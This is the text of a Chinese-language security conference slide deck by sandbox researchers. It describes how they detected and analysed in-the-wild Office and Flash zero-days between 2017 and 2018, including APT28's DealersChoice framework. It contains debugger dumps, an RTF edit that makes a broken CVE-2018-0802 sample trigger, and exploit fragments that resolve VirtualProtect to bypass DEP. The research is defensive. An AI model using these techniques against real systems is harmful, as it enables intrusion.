CVE-2017-8759
CVE-2018-8174
CVE-2018-8373
CVE-2014-4114
CVE-2014-6352
CVE-2015-0097
不断反思
走过的弯路：4个 0day + 1个 1day
2017年4月
• CVE-2017-0261 (0day)
• CVE-2017-0262 (0day) + CVE-2017-0263 (0day)
• 反思
• 沙箱检测引擎有缺陷 ☹
• CVE-2017-0261 样本无法在 Office 2010 触发 ☹
• CVE-2017-0262 样本无法在 Office 2007 触发 ☹
• 当用户态引擎遇见内核 0day ☹
2017年8月
• CVE-2017-8759 (0day)
• 反思
• 沙箱跑出了样本，但未能及时通知分析人员 ☹
2017年10月
• CVE-2017-11292 (1day) 
• 反思
• 对 DealersChoice 框架缺乏了解 ☹
• 若目标为低版本 Flash，下发 CVE-2015-7645 ☹
• 若目标为高版本 Flash，下发 CVE-2017-11292 😀
研究攻击框架
• DealersChoice
• 由 @Unit42_Intel 命名
• 被 APT28 使用
• 持续改进以尽可能地躲避检测
• 初始手法
• 检查当前 Flash 版本
• 地理位置判断
• 存活时间短
• 新手法
• 反沙箱：需要模拟文档下滑
• 改写开源代码，加入恶意功能，躲避静态检测
持续创新
• 沙箱检测引擎缺陷 ☹
• 开发下一代沙箱检测引擎 😀
• 环境选择不正确 ☹
• 制作多种环境 😀
• 制定触发率高的投递策略 😀
• 不能及时通知分析人员 ☹
• 构建实时推送系统 😀
• 对攻击框架不够熟悉 ☹
• 研究 DealersChoice 框架 😀
• 强化 Flash 针对性检测 😀
从0到1
CVE-2017-11826
从0到1
• 2017年9月27日
从0到1
• 第一次有中国厂商抓到 Office 在野 0day
CVE-2017-11826
• OLEObject & Font 对象类型混淆 + ActiveX 控件堆喷射
; Office 2007 下正常执行时
; mov
eax, [eax+44h]
0:000> dc 38450f4 l4c/4
038450f4
0000ffff 0000ffff 00000004 00000004
................
03845104
00000001 00000000 00000000 00000000
................
03845114
00000000 ffffffff ffffffff 00000000
................
03845124
00000000 ffffffff 00000000 00000000
................
03845134
00000000 01d9ffa0 67a02e58
........X..g
; mov
eax, [eax+44h]
0:000> dc 01d9ffa0 l4c/4
01d9ffa0
00000001 00000001 01f47928 00000009
........(y......
01d9ffb0
00000000 00000000 00000000 00000000
................
01d9ffc0
00000000 000004b0 00000000 00000000
................
01d9ffd0
0005003c 00000000 00000000 00000000
 dd 01f7e0a0 l1
01f7e0a0
65d9420c
; call
dword ptr [ecx+4]
0:000> dds 65d9420c l2
65d9420c
65b527ad mso!Ordinal1072+0x2dd
65d94210
658bbe71 mso!Ordinal836+0xaf
// AddRef
; Office 2007 下触发漏洞时
; mov
eax, [eax+44h]
0:000> dc 5998140 l4c/4
05998140
000001de 000000dd 00000015 00000010
................
05998150
00000000 00000000 00000000 00000000
................
05998160
00000000 ffffffff ffffffff 00000000
................
05998170
00000000 ffffffff 00000000 00000000
................
05998180
00000000 04131700 67110a89
...........g
; mov
eax, [eax+44h]
0:000> dc 04131700 l4c/4
04131700
0000045f 00000000 00000000 00000000
_...............
04131710
00000000 00000000 00000000 00000000
................
04131720
00000000 00000000 0069004c 0063006e
........L.i.n.c.
04131730
00720065 00680043 00720061 00680043
e.r.C.h.a.r.C.h.
04131740
00720061 088888ec 006f0066
a.r.....f.o.
; mov
ecx, [eax]
0:000> dd 088888ec l1
088888ec
088883ec
; call
dword ptr [ecx+4]
0:000> dds 088883ec l2
088883ec
72980e2b MSVBVM60!IID_IVbaHost+0x127eb
088883f0
72980e2b MSVBVM60!IID_IVbaHost+0x127eb // Stack Pivot
从1到N
CVE-2018-0802
CVE-2018-8174
CVE-2018-5002
CVE-2018-15982
CVE-2018-0802
• 公式编辑器组件栈溢出
• 2017年12月14日
• 同时内嵌两个漏洞
• CVE-2017-11882 
• CVE-2018-0802
• 可以正常触发和成功利用 😀
• 2017年12月19日
• 只内嵌一个漏洞
• CVE-2018-0802
• 无法正常触发 ☹
• 重新构造 OLE 后可以成功利用 😀
CVE-2018-0802
• 两个样本都报告给了微软
• 2018年1月10日，微软对我们进行了致谢
CVE-2018-0802
• 2017年12月19日的样本
• MD5: 299D0C5F43E59FC9415D70816AEE56C6
• 内嵌 0day 😀
• RTF 混淆 😀
• OLE 数据构造错误 ☹
错误的公式流：
DirEntry SID=4: 
'\xe7\x90\x80\xe6\xa4\x80\xe7\x98\x80\xe6\x94\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe2\
x80\x80\xc8\x80\xef\xbc\x80\xef\xbf\xbf\xef\xbf\xbf\xef\xbf\xbf\xef\xbf\xbf\xef\xbf\xbf\xc3\xbf\x00'
- type: 0
- sect: 0
- SID left: 0, right: 0, child: 0
- size: 0 (sizeLow=0, sizeHigh=0) # logged by olefile.py
正常公式流：
DirEntry SID=4: 'Equation Native'
- type: 2
- sect: 4
- SID left: 4294967295, right: 4294967295, child: 4294967295
- size: 197 (sizeLow=197, sizeHigh=0) # logged by olefile.py
CVE-2018-0802
• 哪里错了？
• 提取解混淆后的 OLE 对象
0:010> bp ole32!OleConvertOLESTREAMToIStorage
0:010> g
Breakpoint 0 hit
eax=000004e0 ebx=059bc3c0 ecx=00008000 edx=00000000 esi=02d80960 edi=001dade8
eip=75c528fa esp=001dab2c ebp=001dadb0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206
ole32!OleConvertOLESTREAMToIStorage:
75c528fa 8bff            mov     edi,edi
0:000> .writemem C:\de-obfuscated_ole.bin poi(poi(poi(esp + 0x04) + 0x08)) Lpoi(poi(esp + 0x04) + 0x0C)
Writing dc5 bytes..
0:000> db poi(poi(poi(esp + 0x04) + 0x08))
04946510  01 05 00 00 02 00 00 00-0b 00 00 00 45 71 75 61  ............Equa
04946520  74 69 6f 6e 2e 33 00 00-00 00 00 00 00 00 00 00  tion.3..........
04946530  0e 00 00 d0 cf 11 e0 a1-b1 1a e1 00 00 00 00 00  ................
04946540  00 00 00 00 00 00 00 00-00 00 00 3e 00 03 00 fe
...........>....
04946550  ff 09 00 06 00 00 00 00-00 00 00 00 00 00 00 01  ................
04946560  00 00 00 01 00 00 00 00-00 00 00 00 10 00 00 02  ................
04946570  00 00 00 01 00 00 00 fe-ff ff ff 00 00 00 00 00  ................
04946580  00 00 00 ff ff ff ff ff-ff ff ff ff ff ff ff ff
................
CVE-2018-0802
• 哪里错了？
• MiniFat Sector 错位 0x15 字节
CVE-2018-0802
• 如何“修复”？
• 对原始 RTF 文档稍作修改 😀
{\object\objemb\objupdate{\*\objclass Equation.3}\objw380\objh260{\*\objdata 01050000{{\object}}
02000000
0b000000
4571756174696f6e2e3300
00000000
00000000
000e0000 ; Data Size
d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff090006000000000000
...
000000000000000000000000000000000000000000feffffff02000000 ; 在 MiniFat Sector 前面填充 42 个 0
...
{\oldff}0a00ffffffff0100000000001c000000fb021000070000000000bc02000000000102022253797374656d000048008a0100000a0006000
0004800{\ole}8a01ffffffff7cef1800040000002d01010004000000f00100000300000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 ; 补足长度
以满足 Data Size
...
0105000000000000 ; 补充 Presentation 数据
CVE-2018-0802
• 2018年元旦后，更多 CVE-2018-0802 样本出现
• 其他研究员注意到了这些样本，但不知道它们利用了 0day ☹
如何区分两个漏洞
IPersistStorage::Load(406881)
offset:406a93     call ReadMTEFData(42f8ff)
offset:42f921     call 43755c
offset:4375d5    call 43a720
offset:43a72a    call 43a87a
offset:43a89b    call 43b418
; Font tag parse Logic
offset:43b44b    call ReadFontName(4164fa)
offset:43b461    call 4214c6
offset:4214dd    call LogfontStruct_Overflow(421774)
offset:4217c3    call 421e39 
offset:421e5e    rep movsd  超长数组 -> 任意地址读写
// before mem = Value
0:005> dd 022cb91c l4
022cb91c  00000008 00000000 04730834 00000000
0:005> dd 04730834 l6
04730834  08800001 00000001 00000000 00000000
04730844  7fffffff 00000000
// after mem = Value
0:007> dd 022cb91c l4
022cb91c  0000200c 00000000 04730834 00000000
0:007> dd 04730834 l6
04730834  08800001 00000001 00000000 00000000
04730844  7fffffff 00000000
Class class_setprop_a
Dim mem
Function P
End Function
Function SetProp(Value)
mem = Value 'callback
SetProp = 0
End Function
End Class
CVE-2018-5002
• 2018年6月1日
• 一套复杂的 Flash 控制框架
• AVM2 解释器漏洞
CVE-2018-5002
• 2018年6月7日，Adobe 对我们进行了致谢
CVE-2018-5002
• 绕过 ROP 检测 😀
• 覆盖返回地址绕过 CFG 😀
• 无法绕过 EAF 检测 ☹
var cls25:class_25 = new class_25(cls8, RtlUnwind_Addr);
var NtProtectVirtualMemory_Addr:uint = cls25.GetFuncAddrByEAT("NtProtectVirtualMemory");
if(0 == NtProtectVirtualMemory_Addr)
{
return new Array();
}
var NtPrivilegedServiceAuditAlarm_Addr:uint = cls25.GetFuncAddrByEAT("NtPrivilegedServiceAuditAlarm");
if(0 == NtPrivilegedServiceAuditAlarm_Addr)
{
return new Array();
}
如何调试 CVE-2018-5002
• 逆向 -> ASC2.0 编译 -> 借助 FFDEC 修改字节码 -> 获得可调试的 swf 文件
• 开源的 WinDBG 插件
• https://github.com/michaelpdu/flashext_pykd
• 添加3行代码，让插件变得更完美 😀
def callback_after_call_getmethodname(self):
# dprintln("Enter into callback_after_call_getmethodname")
reg_eax = reg("eax")
# dprintln("EAX = " + hex(reg_eax))
addr_name = ptrPtr(reg_eax + 0x08)
len_name = ptrPtr(reg_eax + 0x10)
if 0 == addr_name and 0 != len_name:
if ptrPtr(reg_eax + 0x0C) != 0:
addr_name = ptrPtr(ptrPtr(reg_eax + 0x0C) + 0x08)
调试器中的 CVE-2018-5002
// 触发漏洞前
0:007> dd 02c0ab24-10
02c0ab14  093101f0 093101a0 093101f0 093101a0
02c0ab24  093101f0 093101a0 093101f0 093101a0
02c0ab34  093101f0 093101a0 093101f0 093101a0
02c0ab44  093101f0 093101a0 093101f0 093101a0
02c0ab54  093101f0 093101a0 093101f0 093101a0
02c0ab64  093101f0 093101a0 093101f0 093101a0
02c0ab74  093101f0 093101a0 093101f0 093101a0
02c0ab84  093101f0 093101a0 093101f0 093101a0
// 触发漏洞后
0:007> dd 02c0ab24-10
02c0ab14  093101f0 093101a0 093101f0 093101f0
02c0ab24  093101a0 093101a0 093101f0 093101a0
02c0ab34  093101f0 093101a0 093101f0 093101a0
02c0ab44  093101f0 093101a0 093101f0 093101a0
02c0ab54  093101f0 093101a0 093101f0 093101a0
02c0ab64  093101f0 093101a0 093101f0 093101a0
02c0ab74  093101f0 093101a0 093101f0 093101a0
02c0ab84  093101f0 093101a0 093101f0 093101a0
• 触发漏洞 -> 交换指针 -> 类型混淆
CVE-2018-15982
• 2018年11月29日
• 2个小时，2个样本
• TVSDK 中的 UAF 漏洞
CVE-2018-15982
• 2018年12月5日，Adobe 再次对我们进行了致谢
CVE-2018-15982
• 用 HackingTeam 的技巧绕过了 ROP 检测 😀
• 无法躲避 EAF 检测 ☹
// Virt(ualPro)tect = 74726956 74636574
var vp_addr:uint = this.getFuncAddrByEAT32(0x74726956, 0x74636574, 10, kernel32_addr);
...
this.writeDWORD32(sc_addr + 8 + 0x80 + 0x1c, vp_addr);
this.writeDWORD32(ptbl, sc_addr + 8 + 0x80);
this.writeDWORD32(p + 0x1c, sc_addr);
this.writeDWORD32(p + 0x20, vec_uint.length * 4);
var args:Array = new Array(0x41);
Payload.call.apply(null, args); // Call VirtualProtect to bypass DEP
其他收获
• 1 Word CVE 😀
• 1 PowerPoint CVE 😀
• 4 Excel CVE 😀
• 1 Win32k CVE 😀
总结
• 从１到Ｎ易，从０到１难
• 了解对手，反思自己，战胜对手
• 永远在路上
致谢
• 感谢 360 高级威胁团队的所有小伙伴
• 感谢 @programmeboy, @guhe120, @binjo, @Unit42_Intel
• 特别感谢 @HaifeiLi 和他关于 Office 安全的分享
大海捞针：使用沙箱捕获多个零日漏洞
李琦
PI:EMAIL
@leeqwind
金权
PI:EMAIL
@jq0904